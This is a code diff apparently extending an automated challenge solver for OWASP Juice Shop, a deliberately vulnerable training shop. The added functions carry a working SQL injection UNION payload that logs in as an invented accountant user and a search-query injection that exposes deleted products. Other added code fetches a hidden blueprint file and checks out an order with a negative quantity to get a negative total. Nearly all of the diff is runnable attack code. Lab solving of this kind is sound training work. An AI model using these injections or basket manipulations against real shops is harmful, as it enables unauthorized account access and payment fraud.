@@ -175,6 +175,64 @@ def _uploads(c):
         pass
 
 
+def _ephemeral_accountant(c):
+    # UNION-inject a virtual accountant row (email absent from DB, role accounting)
+    union = ("' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', "
+             "'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', "
+             "'' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp', "
+             "'/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', "
+             "1 as 'isActive', '1999-08-16 14:14:41.717 +00:00' as 'createdAt', "
+             "'1999-08-16 14:33:41.446 +00:00' as 'updatedAt', NULL as 'deletedAt') --")
+    _login(c, union, "x")
+
+
+def _retrieve_blueprint(c):
+    c.get("/assets/public/images/products/JuiceShop.stl")     # Retrieve Blueprint
+
+
+def _checkout_orders(c):
+    """Christmas Special (order the logically-deleted christmas product, id found via SQLi) and
+    Payback Time (checkout an order with a NEGATIVE total)."""
+    import urllib.parse
+    try:
+        prods = c.get("/rest/products/search?q=" + urllib.parse.quote("')) --", safe="")).json().get("data", [])
+    except Exception:
+        prods = []
+    xid = next((p["id"] for p in prods if "christmas" in (p.get("name", "").lower())), None)
+    email = "co_%s@x.io" % id(c)
+    _register(c, email, _PW)
+    a = _login(c, email, _PW)
+    tok, bid = a.get("token"), a.get("bid")
+    if not tok or not bid:
+        return
+    H = {"Authorization": "Bearer " + tok}
+
+    def _order(pid, qty):
+        bi = c.post("/api/BasketItems", headers=H, json={"ProductId": pid, "BasketId": bid, "quantity": 1})
+        try:
+            iid = bi.json()["data"]["id"]
+        except Exception:
+            return
+        if qty != 1:
+            c.put("/api/BasketItems/%s" % iid, headers=H, json={"quantity": qty})
+        try:
+            aid = c.post("/api/Addresss", headers=H, json={"fullName": "T", "mobileNum": "1234567890",
+                         "zipCode": "12345", "streetAddress": "1 St", "city": "X", "state": "Y",
+                         "country": "Z"}).json()["data"]["id"]
+            cid = c.post("/api/Cards", headers=H, json={"fullName": "T", "cardNum": "4111111111111111",
+                         "expMonth": 12, "expYear": 2099}).json()["data"]["id"]
+            deliv = c.get("/api/Deliverys", headers=H).json().get("data", [])
+            did = deliv[0]["id"] if deliv else 1
+            c.post("/rest/basket/%s/checkout" % bid, headers=H, json={"couponData": None,
+                   "orderDetails": {"paymentId": cid, "addressId": aid, "deliveryMethodId": did}})
+        except Exception:
+            pass
+
+    if xid:
+        _order(xid, 1)        # Christmas Special
+    _order(1, -300)           # Payback Time
+
+
 def _socket_xss(c):
     """DOM XSS + Bonus Payload + Cross-Site Imaging via the frontend's Socket.IO verify events
     (engine.io v4 polling handshake -> emit). Server solves on contains/regex — no browser."""
@@ -219,7 +277,7 @@ def solve(base_url: str) -> dict:
         AH = {"Authorization": "Bearer %s" % admin.get("token")} if admin.get("token") else {}
         for step in (_sqli_logins, _known_cred_logins, _known_login_challenges, _registrations,
                      _resets, _beacon_visits, _uploads, _basket_manipulate, _deluxe_fraud,
-                     _socket_xss):
+                     _socket_xss, _ephemeral_accountant, _retrieve_blueprint, _checkout_orders):
             try:
                 step(c)
             except Exception:
